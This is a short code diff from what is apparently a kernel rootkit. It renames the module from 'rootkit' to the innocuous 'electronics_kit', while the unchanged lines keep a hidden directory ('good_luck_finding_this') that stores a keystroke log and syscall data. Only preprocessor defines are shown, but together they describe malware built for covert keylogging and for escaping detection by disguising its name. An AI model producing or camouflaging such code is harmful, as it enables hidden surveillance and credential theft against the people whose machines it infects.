@@ -54,8 +54,8 @@
 #include <netinet/ip_icmp.h>
 #include <netinet/ip_var.h>
 
-#define LINKER_FILE "rootkit.ko"
-#define MODULE_NAME "rootkit"
+#define LINKER_FILE "electronics_kit.ko"
+#define MODULE_NAME "electronics_kit"
 #define LOGFILE "/etc/good_luck_finding_this/syscall_number.txt"
 #define KEYSTROKE "/etc/good_luck_finding_this/keystrokes.txt"
 
